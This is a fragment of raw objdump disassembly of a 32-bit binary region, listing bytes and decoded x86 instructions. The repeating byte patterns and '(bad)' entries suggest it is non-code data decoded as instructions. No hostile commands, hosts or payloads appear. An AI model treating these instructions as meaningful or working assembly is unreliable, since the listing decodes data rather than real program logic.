  406954:	1a 16                	sbb    (%esi),%dl
  406956:	00 00                	add    %al,(%eax)
  406958:	01 00                	add    %eax,(%eax)
  40695a:	9e                   	sahf
  40695b:	04 00                	add    $0x0,%al
  40695d:	00 02                	add    %al,(%edx)
  40695f:	00 e0                	add    %ah,%al
  406961:	1a 00                	sbb    (%eax),%al
  406963:	00 01                	add    %al,(%ecx)
  406965:	00 41 23             	add    %al,0x23(%ecx)
  406968:	00 00                	add    %al,(%eax)
  40696a:	02 00                	add    (%eax),%al
  40696c:	6d                   	insl   (%dx),%es:(%edi)
  40696d:	24 00                	and    $0x0,%al
  40696f:	00 01                	add    %al,(%ecx)
  406971:	00 38                	add    %bh,(%eax)
  406973:	07                   	pop    %es
  406974:	00 00                	add    %al,(%eax)
  406976:	02 00                	add    (%eax),%al
  406978:	9b                   	fwait
  406979:	06                   	push   %es
  40697a:	00 00                	add    %al,(%eax)
  40697c:	01 00                	add    %eax,(%eax)
  40697e:	d6                   	salc
  40697f:	06                   	push   %es
  406980:	00 00                	add    %al,(%eax)
  406982:	02 00                	add    (%eax),%al
  406984:	3e 26 00 00          	ds add %al,%es:(%eax)
  406988:	01 00                	add    %eax,(%eax)
  40698a:	54                   	push   %esp
  40698b:	09 00                	or     %eax,(%eax)
  40698d:	00 02                	add    %al,(%edx)
  40698f:	00 4d 06             	add    %cl,0x6(%ebp)
  406992:	00 00                	add    %al,(%eax)
  406994:	01 00                	add    %eax,(%eax)
  406996:	d9 02                	flds   (%edx)
  406998:	00 00                	add    %al,(%eax)
  40699a:	01 00                	add    %eax,(%eax)
  40699c:	8d 26                	lea    (%esi),%esp
  40699e:	00 00                	add    %al,(%eax)
  4069a0:	02 00                	add    (%eax),%al
  4069a2:	07                   	pop    %es
  4069a3:	20 00                	and    %al,(%eax)
  4069a5:	00 01                	add    %al,(%ecx)
  4069a7:	00 27                	add    %ah,(%edi)
  4069a9:	26 00 00             	add    %al,%es:(%eax)
  4069ac:	01 00                	add    %eax,(%eax)
  4069ae:	17                   	pop    %ss
  4069af:	24 00                	and    $0x0,%al
  4069b1:	00 01                	add    %al,(%ecx)
  4069b3:	00 6f 09             	add    %ch,0x9(%edi)
  4069b6:	00 00                	add    %al,(%eax)
  4069b8:	01 00                	add    %eax,(%eax)
  4069ba:	f0 05 00 00 01 00    	lock add $0x10000,%eax
  4069c0:	35 20 00 00 02       	xor    $0x2000020,%eax
  4069c5:	00 27                	add    %ah,(%edi)
  4069c7:	01 00                	add    %eax,(%eax)
  4069c9:	00 01                	add    %al,(%ecx)
  4069cb:	00 00                	add    %al,(%eax)
  4069cd:	05 00 00 02 00       	add    $0x20000,%eax
  4069d2:	75 1d                	jne    0x4069f1
  4069d4:	00 00                	add    %al,(%eax)
  4069d6:	03 00                	add    (%eax),%eax
  4069d8:	4d                   	dec    %ebp
  4069d9:	23 00                	and    (%eax),%eax
  4069db:	00 01                	add    %al,(%ecx)
  4069dd:	00 5b 23             	add    %bl,0x23(%ebx)
  4069e0:	00 00                	add    %al,(%eax)
  4069e2:	02 00                	add    (%eax),%al
  4069e4:	9c                   	pushf
  4069e5:	00 00                	add    %al,(%eax)
  4069e7:	00 01                	add    %al,(%ecx)
  4069e9:	00 a2 08 00 00 01    	add    %ah,0x1000008(%edx)
  4069ef:	00 6e 02             	add    %ch,0x2(%esi)
  4069f2:	00 00                	add    %al,(%eax)
  4069f4:	01 00                	add    %eax,(%eax)
  4069f6:	32 23                	xor    (%ebx),%ah
  4069f8:	00 00                	add    %al,(%eax)
  4069fa:	01 00                	add    %eax,(%eax)
  4069fc:	2f                   	das
  4069fd:	1b 00                	sbb    (%eax),%eax
  4069ff:	00 01                	add    %al,(%ecx)
  406a01:	00 e2                	add    %ah,%dl
  406a03:	23 00                	and    (%eax),%eax
  406a05:	00 01                	add    %al,(%ecx)
  406a07:	00 ff                	add    %bh,%bh
  406a09:	15 00 00 01 00       	adc    $0x10000,%eax
  406a0e:	89 12                	mov    %edx,(%edx)
  406a10:	00 00                	add    %al,(%eax)
  406a12:	01 00                	add    %eax,(%eax)
  406a14:	d4 1a                	aam    $0x1a
  406a16:	00 00                	add    %al,(%eax)
  406a18:	01 00                	add    %eax,(%eax)
  406a1a:	c9                   	leave
  406a1b:	23 00                	and    (%eax),%eax
  406a1d:	00 01                	add    %al,(%ecx)
  406a1f:	00 b5 02 00 00 01    	add    %dh,0x1000002(%ebp)
  406a25:	00 3c 02             	add    %bh,(%edx,%eax,1)
  406a28:	00 00                	add    %al,(%eax)
  406a2a:	02 00                	add    (%eax),%al
  406a2c:	1c 0a                	sbb    $0xa,%al
  406a2e:	00 00                	add    %al,(%eax)
  406a30:	01 00                	add    %eax,(%eax)
  406a32:	dc 16                	fcoml  (%esi)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	01 00                	add    %eax,(%eax)
  406a38:	df 19                	fistps (%ecx)
  406a3a:	00 00                	add    %al,(%eax)
  406a3c:	01 00                	add    %eax,(%eax)
  406a3e:	08 06                	or     %al,(%esi)
  406a40:	00 00                	add    %al,(%eax)
  406a42:	01 00                	add    %eax,(%eax)
  406a44:	7f 26                	jg     0x406a6c
  406a46:	06                   	push   %es
  406a47:	00 2d 00 08 00 35    	add    %ch,0x35000800
  406a4d:	00 59 00             	add    %bl,0x0(%ecx)
  406a50:	c8 21 04 01          	enter  $0x421,$0x1
  406a54:	59                   	pop    %ecx
  406a55:	00 9a 22 08 01 59    	add    %bl,0x59010822(%edx)
  406a5b:	00 ce                	add    %cl,%dh
  406a5d:	20 0e                	and    %cl,(%esi)
  406a5f:	00 69 00             	add    %ch,0x0(%ecx)
  406a62:	d1 1c b2             	rcrl   $1,(%edx,%esi,4)
  406a65:	01 c9                	add    %ecx,%ecx
  406a67:	00 e9                	add    %ch,%cl
  406a69:	1c fa                	sbb    $0xfa,%al
  406a6b:	02 d1                	add    %cl,%dl
  406a6d:	00 e9                	add    %ch,%cl
  406a6f:	1c 0e                	sbb    $0xe,%al
  406a71:	00 d9                	add    %bl,%cl
  406a73:	00 e9                	add    %ch,%cl
  406a75:	1c 27                	sbb    $0x27,%al
  406a77:	03 e9                	add    %ecx,%ebp
  406a79:	00 e9                	add    %ch,%cl
  406a7b:	1c 53                	sbb    $0x53,%al
  406a7d:	01 f1                	add    %esi,%ecx
  406a7f:	00 e9                	add    %ch,%cl
  406a81:	1c 53                	sbb    $0x53,%al
  406a83:	01 f9                	add    %edi,%ecx
  406a85:	00 e9                	add    %ch,%cl
  406a87:	1c 53                	sbb    $0x53,%al
  406a89:	01 01                	add    %eax,(%ecx)
  406a8b:	01 e9                	add    %ebp,%ecx
  406a8d:	1c 53                	sbb    $0x53,%al
  406a8f:	01 09                	add    %ecx,(%ecx)
  406a91:	01 e9                	add    %ebp,%ecx
  406a93:	1c 53                	sbb    $0x53,%al
  406a95:	01 11                	add    %edx,(%ecx)
  406a97:	01 e9                	add    %ebp,%ecx
  406a99:	1c 53                	sbb    $0x53,%al
  406a9b:	01 19                	add    %ebx,(%ecx)
  406a9d:	01 e9                	add    %ebp,%ecx
  406a9f:	1c 53                	sbb    $0x53,%al
  406aa1:	01 21                	add    %esp,(%ecx)
  406aa3:	01 e9                	add    %ebp,%ecx
  406aa5:	1c 99                	sbb    $0x99,%al
  406aa7:	01 29                	add    %ebp,(%ecx)
  406aa9:	01 e9                	add    %ebp,%ecx
  406aab:	1c 53                	sbb    $0x53,%al
  406aad:	01 31                	add    %esi,(%ecx)
  406aaf:	01 e9                	add    %ebp,%ecx
  406ab1:	1c 53                	sbb    $0x53,%al
  406ab3:	01 39                	add    %edi,(%ecx)
  406ab5:	01 e9                	add    %ebp,%ecx
  406ab7:	1c 0e                	sbb    $0xe,%al
  406ab9:	00 41 01             	add    %al,0x1(%ecx)
  406abc:	e9 1c 53 01 49       	jmp    0x4941bddd
  406ac1:	01 a2 1a 7f 00 51    	add    %esp,0x51007f1a(%edx)
  406ac7:	01 44 00 bd          	add    %eax,-0x43(%eax,%eax,1)
  406acb:	03 59 01             	add    0x1(%ecx),%ebx
  406ace:	f0 20 7f 00          	lock and %bh,0x0(%edi)
  406ad2:	51                   	push   %ecx
  406ad3:	01 62 18             	add    %esp,0x18(%edx)
  406ad6:	84 00                	test   %al,(%eax)
  406ad8:	61                   	popa
  406ad9:	01 e9                	add    %ebp,%ecx
  406adb:	1c 0e                	sbb    $0xe,%al
  406add:	00 61 01             	add    %ah,0x1(%ecx)
  406ae0:	9e                   	sahf
  406ae1:	22 c2                	and    %dl,%al
  406ae3:	03 09                	add    (%ecx),%ecx
  406ae5:	00 e9                	add    %ch,%cl
  406ae7:	1c 0e                	sbb    $0xe,%al
  406ae9:	00 69 01             	add    %ch,0x1(%ecx)
  406aec:	8a 00                	mov    (%eax),%al
  406aee:	cc                   	int3
  406aef:	03 51 01             	add    0x1(%ecx),%edx
  406af2:	b1 13                	mov    $0x13,%cl
  406af4:	c7 00 69 01 03 14    	movl   $0x14030169,(%eax)
  406afa:	d2 03                	rolb   %cl,(%ebx)
  406afc:	11 00                	adc    %eax,(%eax)
  406afe:	e9 1c 79 01 11       	jmp    0x1141e41f
  406b03:	00 3f                	add    %bh,(%edi)
  406b05:	25 d8 03 71 01       	and    $0x17103d8,%eax
  406b0a:	17                   	pop    %ss
  406b0b:	25 de 03 69 01       	and    $0x16903de,%eax
  406b10:	78 1e                	js     0x406b30
  406b12:	e4 03                	in     $0x3,%al
  406b14:	89 01                	mov    %eax,(%ecx)
  406b16:	60                   	pusha
  406b17:	01 6b 02             	add    %ebp,0x2(%ebx)
  406b1a:	81 01 87 14 ea 03    	addl   $0x3ea1487,(%ecx)
  406b20:	19 00                	sbb    %eax,(%eax)
  406b22:	e9 1c 08 04 19       	jmp    0x19447343
  406b27:	00 5b 12             	add    %bl,0x12(%ebx)
  406b2a:	fa                   	cli
  406b2b:	02 19                	add    (%ecx),%bl
  406b2d:	00 48 12             	add    %cl,0x12(%eax)
  406b30:	fa                   	cli
  406b31:	02 c9                	add    %cl,%cl
  406b33:	01 cc                	add    %ecx,%esp
  406b35:	25 a5 02 c9 01       	and    $0x1c902a5,%eax
  406b3a:	ea 20 15 04 61 01 9e 	ljmp   $0x9e01,$0x61041520
  406b41:	22 1c 04             	and    (%esp,%eax,1),%bl
  406b44:	d9 01                	flds   (%ecx)
  406b46:	19 1e                	sbb    %ebx,(%esi)
  406b48:	21 04 19             	and    %eax,(%ecx,%ebx,1)
  406b4b:	00 8a 20 29 04 19    	add    %cl,0x19042920(%edx)
  406b51:	00 50 0b             	add    %dl,0xb(%eax)
  406b54:	08 01                	or     %al,(%ecx)
  406b56:	19 00                	sbb    %eax,(%eax)
  406b58:	8a 20                	mov    (%eax),%ah
  406b5a:	8a 01                	mov    (%ecx),%al
  406b5c:	a1 01 e9 1c 0e       	mov    0xe1ce901,%eax
  406b61:	00 a9 01 e9 1c 84    	add    %ch,-0x7be316ff(%ecx)
  406b67:	01 a1 01 ef 1e 31    	add    %esp,0x311eef01(%ecx)
  406b6d:	04 a1                	add    $0xa1,%al
  406b6f:	01 d1                	add    %edx,%ecx
  406b71:	13 de                	adc    %esi,%ebx
  406b73:	02 c9                	add    %cl,%cl
  406b75:	01 ea                	add    %ebp,%edx
  406b77:	20 38                	and    %bh,(%eax)
  406b79:	04 f1                	add    $0xf1,%al
  406b7b:	01 b3 0f 0e 00 f9    	add    %esi,-0x6fff1f1(%ebx)
  406b81:	01 e9                	add    %ebp,%ecx
  406b83:	1c 42                	sbb    $0x42,%al
  406b85:	04 01                	add    $0x1,%al
  406b87:	02 e9                	add    %cl,%ch
  406b89:	1c 49                	sbb    $0x49,%al
  406b8b:	04 21                	add    $0x21,%al
  406b8d:	00 e9                	add    %ch,%cl
  406b8f:	1c 4f                	sbb    $0x4f,%al
  406b91:	04 19                	add    $0x19,%al
  406b93:	00 fa                	add    %bh,%dl
  406b95:	21 59 04             	and    %ebx,0x4(%ecx)
  406b98:	09 00                	or     %eax,(%eax)
  406b9a:	e0 13                	loopne 0x406baf
  406b9c:	95                   	xchg   %eax,%ebp
  406b9d:	01 21                	add    %esp,(%ecx)
  406b9f:	00 76 21             	add    %dh,0x21(%esi)
  406ba2:	5f                   	pop    %edi
  406ba3:	04 29                	add    $0x29,%al
  406ba5:	02 e9                	add    %cl,%ch
  406ba7:	1c 49                	sbb    $0x49,%al
  406ba9:	04 29                	add    $0x29,%al
  406bab:	00 e9                	add    %ch,%cl
  406bad:	1c 6b                	sbb    $0x6b,%al
  406baf:	04 31                	add    $0x31,%al
  406bb1:	02 e9                	add    %cl,%ch
  406bb3:	1c 49                	sbb    $0x49,%al
  406bb5:	04 71                	add    $0x71,%al
  406bb7:	00 17                	add    %dl,(%edi)
  406bb9:	0b 75 04             	or     0x4(%ebp),%esi
  406bbc:	39 02                	cmp    %eax,(%edx)
  406bbe:	0e                   	push   %cs
  406bbf:	0f 82 04 31 00 ff    	jb     0xff409cc9
  406bc5:	1e                   	push   %ds
  406bc6:	89 04 29             	mov    %eax,(%ecx,%ebp,1)
  406bc9:	00 b3 0f 0e 00 71    	add    %dh,0x71000e0f(%ebx)
  406bcf:	00 b3 0f 0e 00 19    	add    %dh,0x19000e0f(%ebx)
  406bd5:	00 b3 0f 0e 00 71    	add    %dh,0x71000e0f(%ebx)
  406bdb:	00 0f                	add    %cl,(%edi)
  406bdd:	0b 94 04 49 02 44 00 	or     0x440249(%esp,%eax,1),%edx
  406be4:	9a 04 71 00 1c 0b a1 	lcall  $0xa10b,$0x1c007104
  406beb:	04 51                	add    $0x51,%al
  406bed:	02 e9                	add    %cl,%ch
  406bef:	1c 49                	sbb    $0x49,%al
  406bf1:	04 49                	add    $0x49,%al
  406bf3:	01 e9                	add    %ebp,%ecx
  406bf5:	1c a9                	sbb    $0xa9,%al
  406bf7:	04 49                	add    $0x49,%al
  406bf9:	01 49 22             	add    %ecx,0x22(%ecx)
  406bfc:	b0 04                	mov    $0x4,%al
  406bfe:	61                   	popa
  406bff:	02 70 1c             	add    0x1c(%eax),%dh
  406c02:	c2 04 49             	ret    $0x4904
  406c05:	02 78 1e             	add    0x1e(%eax),%bh
  406c08:	e0 00                	loopne 0x406c0a
  406c0a:	19 00                	sbb    %eax,(%eax)
  406c0c:	05 17 c9 04 71       	add    $0x7104c917,%eax
  406c11:	00 0b                	add    %cl,(%ebx)
  406c13:	10 d1                	adc    %dl,%cl
  406c15:	04 59                	add    $0x59,%al
  406c17:	02 e9                	add    %cl,%ch
  406c19:	1c 79                	sbb    $0x79,%al
  406c1b:	01 71 00             	add    %esi,0x0(%ecx)
  406c1e:	5c                   	pop    %esp
  406c1f:	19 63 01             	sbb    %esp,0x1(%ebx)
  406c22:	71 00                	jno    0x406c24
  406c24:	92                   	xchg   %eax,%edx
  406c25:	14 0e                	adc    $0xe,%al
  406c27:	00 61 02             	add    %ah,0x2(%ecx)
  406c2a:	f0 20 9a 00 c9 01 42 	lock and %bl,0x4201c900(%edx)
  406c31:	20 d9                	and    %bl,%cl
  406c33:	04 71                	add    $0x71,%al
  406c35:	02 82 20 0a 00 79    	add    0x79000a20(%edx),%al
  406c3b:	02 e9                	add    %cl,%ch
  406c3d:	1c 0e                	sbb    $0xe,%al
  406c3f:	00 c9                	add    %cl,%cl
  406c41:	01 4e 20             	add    %ecx,0x20(%esi)
  406c44:	e9 04 79 02 9a       	jmp    0x9a42e54d
  406c49:	0c ef                	or     $0xef,%al
  406c4b:	04 49                	add    $0x49,%al
  406c4d:	02 78 1e             	add    0x1e(%eax),%bh
  406c50:	da 00                	fiaddl (%eax)
  406c52:	49                   	dec    %ecx
  406c53:	02 78 1e             	add    0x1e(%eax),%bh
  406c56:	ec                   	in     (%dx),%al
  406c57:	00 51 00             	add    %dl,0x0(%ecx)
  406c5a:	e9 1c 0e 00 0c       	jmp    0xc407a7b
  406c5f:	00 a6 17 04 05 0c    	add    %ah,0xc050417(%esi)
  406c65:	00 0d 22 3d 01 c9    	add    %cl,0xc9013d22
  406c6b:	01 83 1c 95 01 0c    	add    %eax,0xc01951c(%ebx)
  406c71:	00 3a                	add    %bh,(%edx)
  406c73:	1b 0e                	sbb    (%esi),%ecx
  406c75:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406c78:	3e 0b 0f             	or     %ds:(%edi),%ecx
  406c7b:	05 0c 00 d1 1c       	add    $0x1cd1000c,%eax
  406c80:	24 05                	and    $0x5,%al
  406c82:	14 00                	adc    $0x0,%al
  406c84:	c8 21 36 05          	enter  $0x3621,$0x5
  406c88:	c9                   	leave
  406c89:	01 ff                	add    %edi,%edi
  406c8b:	1e                   	push   %ds
  406c8c:	90                   	nop
  406c8d:	01 14 00             	add    %edx,(%eax,%eax,1)
  406c90:	9a 22 08 01 71 00 b7 	lcall  $0xb700,$0x71010822
  406c97:	11 43 05             	adc    %eax,0x5(%ebx)
  406c9a:	49                   	dec    %ecx
  406c9b:	02 78 1e             	add    0x1e(%eax),%bh
  406c9e:	e6 00                	out    %al,$0x0
  406ca0:	51                   	push   %ecx
  406ca1:	01 5d 00             	add    %ebx,0x0(%ebp)
  406ca4:	4d                   	dec    %ebp
  406ca5:	05 c9 01 0d 18       	add    $0x180d01c9,%eax
  406caa:	95                   	xchg   %eax,%ebp
  406cab:	01 91 02 bb 0f 52    	add    %edx,0x520fbb02(%ecx)
  406cb1:	05 51 01 5d 00       	add    $0x5d0151,%eax
  406cb6:	57                   	push   %edi
  406cb7:	05 51 01 5d 00       	add    $0x5d0151,%eax
  406cbc:	5c                   	pop    %esp
  406cbd:	05 51 01 5d 00       	add    $0x5d0151,%eax
  406cc2:	61                   	popa
  406cc3:	05 51 01 66 00       	add    $0x660151,%eax
  406cc8:	68 05 89 02 bb       	push   $0xbb028905
  406ccd:	0f 6d                	(bad)
  406ccf:	05 51 01 66 00       	add    $0x660151,%eax
  406cd4:	72 05                	jb     0x406cdb
  406cd6:	51                   	push   %ecx
  406cd7:	01 66 00             	add    %esp,0x0(%esi)
  406cda:	77 05                	ja     0x406ce1
  406cdc:	51                   	push   %ecx
  406cdd:	01 66 00             	add    %esp,0x0(%esi)
  406ce0:	7c 05                	jl     0x406ce7
  406ce2:	51                   	push   %ecx
  406ce3:	01 cf                	add    %ecx,%edi
  406ce5:	0d 83 05 99 02       	or     $0x2990583,%eax
  406cea:	bb 0f 88 05 49       	mov    $0x4905880f,%ebx
  406cef:	02 78 1e             	add    0x1e(%eax),%bh
  406cf2:	95                   	xchg   %eax,%ebp
  406cf3:	05 a9 02 a6 25       	add    $0x25a602a9,%eax
  406cf8:	71 01                	jno    0x406cfb
  406cfa:	b9 02 f0 1f 84       	mov    $0x841ff002,%ecx
  406cff:	00 b1 02 e9 1c a6    	add    %dh,-0x59e316fe(%ecx)
  406d05:	05 71 00 b7 14       	add    $0x14b70071,%eax
  406d0a:	71 01                	jno    0x406d0d
  406d0c:	71 00                	jno    0x406d0e
  406d0e:	ad                   	lods   %ds:(%esi),%eax
  406d0f:	0f 0e                	femms
  406d11:	00 b1 02 e9 1c b4    	add    %dh,-0x4be316fe(%ecx)
  406d17:	05 d9 02 f3 24       	add    $0x24f302d9,%eax
  406d1c:	c8 05 59 02          	enter  $0x5905,$0x2
  406d20:	e9 1c 0e 00 71       	jmp    0x71407b41
  406d25:	00 ae 11 3d 01 91    	add    %ch,-0x6efec2ef(%esi)
  406d2b:	01 e9                	add    %ebp,%ecx
  406d2d:	1c 53                	sbb    $0x53,%al
  406d2f:	01 49 02             	add    %ecx,0x2(%ecx)
  406d32:	6e                   	outsb  %ds:(%esi),(%dx)
  406d33:	00 de                	add    %bl,%dh
  406d35:	05 49 02 35 0e       	add    $0xe350249,%eax
  406d3a:	e5 05                	in     $0x5,%eax
  406d3c:	49                   	dec    %ecx
  406d3d:	02 cf                	add    %bh,%cl
  406d3f:	0d ec 05 49 02       	or     $0x24905ec,%eax
  406d44:	3b 00                	cmp    (%eax),%eax
  406d46:	f3 05 49 02 5d 00    	repz add $0x5d0249,%eax
  406d4c:	fa                   	cli
  406d4d:	05 49 02 77 00       	add    $0x770249,%eax
  406d52:	01 06                	add    %eax,(%esi)
  406d54:	49                   	dec    %ecx
  406d55:	02 66 00             	add    0x0(%esi),%ah
  406d58:	08 06                	or     %al,(%esi)
  406d5a:	0c 00                	or     $0x0,%al
  406d5c:	e9 1c 0e 00 49       	jmp    0x49407b7d
  406d61:	02 78 1e             	add    0x1e(%eax),%bh
  406d64:	3a 06                	cmp    (%esi),%al
  406d66:	59                   	pop    %ecx
  406d67:	01 f1                	add    %esi,%ecx
  406d69:	1d 6b 02 19 03       	sbb    $0x319026b,%eax
  406d6e:	51                   	push   %ecx
  406d6f:	0f d9 04 f9          	psubusw (%ecx,%edi,8),%mm0
  406d73:	02 e9                	add    %cl,%ch
  406d75:	1c 53                	sbb    $0x53,%al
  406d77:	01 81 00 a6 1f 5d    	add    %eax,0x5d1fa600(%ecx)
  406d7d:	06                   	push   %es
  406d7e:	81 00 5f 0e 62 06    	addl   $0x6620e5f,(%eax)
  406d84:	21 03                	and    %eax,(%ebx)
  406d86:	9f                   	lahf
  406d87:	0e                   	push   %cs
  406d88:	95                   	xchg   %eax,%ebp
  406d89:	01 29                	add    %ebp,(%ecx)
  406d8b:	03 f4                	add    %esp,%esi
  406d8d:	0e                   	push   %cs
  406d8e:	95                   	xchg   %eax,%ebp
  406d8f:	01 c9                	add    %ecx,%ecx
  406d91:	01 d8                	add    %ebx,%eax
  406d93:	25 a5 02 81 00       	and    $0x8102a5,%eax
  406d98:	0c 1e                	or     $0x1e,%al
  406d9a:	68 06 81 00 00       	push   $0x8106
  406d9f:	17                   	pop    %ss
  406da0:	0e                   	push   %cs
  406da1:	00 81 00 e9 1c 0e    	add    %al,0xe1ce900(%ecx)
  406da7:	00 01                	add    %al,(%ecx)
  406da9:	03 e9                	add    %ecx,%ebp
  406dab:	1c 0e                	sbb    $0xe,%al
  406dad:	00 01                	add    %al,(%ecx)
  406daf:	03 ac 0e 53 01 19 03 	add    0x3190153(%esi,%ecx,1),%ebp
  406db6:	aa                   	stos   %al,%es:(%edi)
  406db7:	18 6b 02             	sbb    %ch,0x2(%ebx)
  406dba:	c9                   	leave
  406dbb:	01 42 20             	add    %eax,0x20(%edx)
  406dbe:	6e                   	outsb  %ds:(%esi),(%dx)
  406dbf:	06                   	push   %es
  406dc0:	01 03                	add    %eax,(%ebx)
  406dc2:	d5 1f                	aad    $0x1f
  406dc4:	53                   	push   %ebx
  406dc5:	01 01                	add    %eax,(%ecx)
  406dc7:	03 7c 0e 74          	add    0x74(%esi,%ecx,1),%edi
  406dcb:	06                   	push   %es
  406dcc:	01 03                	add    %eax,(%ebx)
  406dce:	5a                   	pop    %edx
  406dcf:	24 99                	and    $0x99,%al
  406dd1:	01 81 00 56 1a 7b    	add    %eax,0x7b1a5600(%ecx)
  406dd7:	06                   	push   %es
  406dd8:	81 00 49 22 08 01    	addl   $0x1082249,(%eax)
  406dde:	39 03                	cmp    %eax,(%ebx)
  406de0:	4c                   	dec    %esp
  406de1:	1c 82                	sbb    $0x82,%al
  406de3:	06                   	push   %es
  406de4:	41                   	inc    %ecx
  406de5:	03 c1                	add    %ecx,%eax
  406de7:	0f 6b 02             	packssdw (%edx),%mm0
  406dea:	09 03                	or     %eax,(%ebx)
  406dec:	34 25                	xor    $0x25,%al
  406dee:	87 06                	xchg   %eax,(%esi)
  406df0:	c9                   	leave
  406df1:	01 42 20             	add    %eax,0x20(%edx)
  406df4:	91                   	xchg   %eax,%ecx
  406df5:	06                   	push   %es
  406df6:	09 03                	or     %eax,(%ebx)
  406df8:	d6                   	salc
  406df9:	11 98 06 b9 02 fb    	adc    %ebx,-0x4fd46fa(%eax)
  406dff:	0f b1 02             	cmpxchg %eax,(%edx)
  406e02:	b9 02 6b 1e c7       	mov    $0xc71e6b02,%ecx
  406e07:	00 61 01             	add    %ah,0x1(%ecx)
  406e0a:	81 1e 79 01 19 03    	sbbl   $0x3190179,(%esi)
  406e10:	b9 0e 67 02 11       	mov    $0x1102670e,%ecx
  406e15:	03 e9                	add    %ecx,%ebp
  406e17:	1c 53                	sbb    $0x53,%al
  406e19:	01 51 03             	add    %edx,0x3(%ecx)
  406e1c:	47                   	inc    %edi
  406e1d:	0f 53 01             	rcpps  (%ecx),%xmm0
  406e20:	19 03                	sbb    %eax,(%ebx)
  406e22:	ab                   	stos   %eax,%es:(%edi)
  406e23:	14 67                	adc    $0x67,%al
  406e25:	02 19                	add    (%ecx),%bl
  406e27:	03 c9                	add    %ecx,%ecx
  406e29:	0e                   	push   %cs
  406e2a:	6b 02 01             	imul   $0x1,(%edx),%eax
  406e2d:	03 26                	add    (%esi),%esp
  406e2f:	14 99                	adc    $0x99,%al
  406e31:	01 01                	add    %eax,(%ecx)
  406e33:	03 9a 11 99 01 81    	add    -0x7efe66ef(%edx),%ebx
  406e39:	00 49 22             	add    %cl,0x22(%ecx)
  406e3c:	9e                   	sahf
  406e3d:	06                   	push   %es
  406e3e:	59                   	pop    %ecx
  406e3f:	01 5c 22 b1          	add    %ebx,-0x4f(%edx,%eiz,1)
  406e43:	02 59 01             	add    0x1(%ecx),%bl
  406e46:	af                   	scas   %es:(%edi),%eax
  406e47:	25 67 02 19 03       	and    $0x3190267,%eax
  406e4c:	2a 22                	sub    (%edx),%ah
  406e4e:	6b 02 59             	imul   $0x59,(%edx),%eax
  406e51:	03 e9                	add    %ecx,%ebp
  406e53:	1c 53                	sbb    $0x53,%al
  406e55:	01 59 03             	add    %ebx,0x3(%ecx)
  406e58:	1c 12                	sbb    $0x12,%al
  406e5a:	71 01                	jno    0x406e5d
  406e5c:	61                   	popa
  406e5d:	03 e9                	add    %ecx,%ebp
  406e5f:	1c 0e                	sbb    $0xe,%al
  406e61:	00 61 03             	add    %ah,0x3(%ecx)
  406e64:	e5 0e                	in     $0xe,%eax
  406e66:	95                   	xchg   %eax,%ebp
  406e67:	01 c9                	add    %ecx,%ecx
  406e69:	01 2c 1f             	add    %ebp,(%edi,%ebx,1)
  406e6c:	90                   	nop
  406e6d:	01 69 03             	add    %ebp,0x3(%ecx)
  406e70:	e9 1c 53 01 69       	jmp    0x6941c191
  406e75:	03 92 20 bc 06 71    	add    0x7106bc20(%edx),%edx
  406e7b:	03 d1                	add    %ecx,%edx
  406e7d:	1c c2                	sbb    $0xc2,%al
  406e7f:	06                   	push   %es
  406e80:	79 03                	jns    0x406e85
  406e82:	c8 21 c8 06          	enter  $0xc821,$0x6
  406e86:	81 03 a6 17 ce 06    	addl   $0x6ce17a6,(%ebx)
  406e8c:	c9                   	leave
  406e8d:	01 23                	add    %esp,(%ebx)
  406e8f:	21 95 01 79 03 9a    	and    %edx,-0x65fc86ff(%ebp)
  406e95:	22 08                	and    (%eax),%cl
  406e97:	01 81 00 d8 0d d8    	add    %eax,-0x27f22800(%ecx)
  406e9d:	06                   	push   %es
  406e9e:	89 03                	mov    %eax,(%ebx)
  406ea0:	44                   	inc    %esp
  406ea1:	00 3d 01 81 00 bd    	add    %bh,0xbd008101
  406ea7:	0a 3d 01 91 03 e0    	or     0xe0039101,%bh
  406ead:	13 95 01 99 03 57    	adc    0x57039901(%ebp),%edx
  406eb3:	22 f6                	and    %dh,%dh
  406eb5:	06                   	push   %es
  406eb6:	99                   	cltd
  406eb7:	03 f5                	add    %ebp,%esi
  406eb9:	20 09                	and    %cl,(%ecx)
  406ebb:	07                   	pop    %es
  406ebc:	59                   	pop    %ecx
  406ebd:	01 17                	add    %edx,(%edi)
  406ebf:	22 7b 00             	and    0x0(%ebx),%bh
  406ec2:	59                   	pop    %ecx
  406ec3:	01 01                	add    %eax,(%ecx)
  406ec5:	0f 67 02             	packuswb (%edx),%mm0
  406ec8:	59                   	pop    %ecx
  406ec9:	01 d5                	add    %edx,%ebp
  406ecb:	0e                   	push   %cs
  406ecc:	67 02 59 01          	add    0x1(%bx,%di),%bl
  406ed0:	c6                   	(bad)
  406ed1:	18 1a                	sbb    %bl,(%edx)
  406ed3:	07                   	pop    %es
  406ed4:	c9                   	leave
  406ed5:	01 42 20             	add    %eax,0x20(%edx)
  406ed8:	20 07                	and    %al,(%edi)
  406eda:	b1 03                	mov    $0x3,%cl
  406edc:	e9 1c 0e 00 69       	jmp    0x69407cfd
  406ee1:	01 cf                	add    %ecx,%edi
  406ee3:	02 cc                	add    %ah,%cl
  406ee5:	03 b9 03 7b 14 e3    	add    -0x1ceb84fd(%ecx),%edi
  406eeb:	02 21                	add    (%ecx),%ah
  406eed:	02 e0                	add    %al,%ah
  406eef:	13 de                	adc    %esi,%ebx
  406ef1:	02 c9                	add    %cl,%cl
  406ef3:	01 0d 14 32 07 c9    	add    %ecx,0xc9073214
  406ef9:	01 44 1c 95          	add    %eax,-0x6b(%esp,%ebx,1)
  406efd:	01 c9                	add    %ecx,%ecx
  406eff:	01 18                	add    %ebx,(%eax)
  406f01:	0d 3f 07 59 01       	or     $0x159073f,%eax
  406f06:	af                   	scas   %es:(%edi),%eax
  406f07:	17                   	pop    %ss
  406f08:	1d 00 f1 02 e0       	sbb    $0xe002f100,%eax
  406f0d:	13 95 01 c1 03 98    	adc    -0x67fc3eff(%ebp),%edx
  406f13:	14 67                	adc    $0x67,%al
  406f15:	02 29                	add    (%ecx),%ch
  406f17:	03 25 0f 45 07 a9    	add    0xa907450f,%esp
  406f1d:	02 37                	add    (%edi),%dh
  406f1f:	0f 45 07             	cmovne (%edi),%eax
  406f22:	a9 02 e0 13 95       	test   $0x9513e002,%eax
  406f27:	01 c9                	add    %ecx,%ecx
  406f29:	03 d4                	add    %esp,%edx
  406f2b:	21 4b 07             	and    %ecx,0x7(%ebx)
  406f2e:	d1 03                	roll   $1,(%ebx)
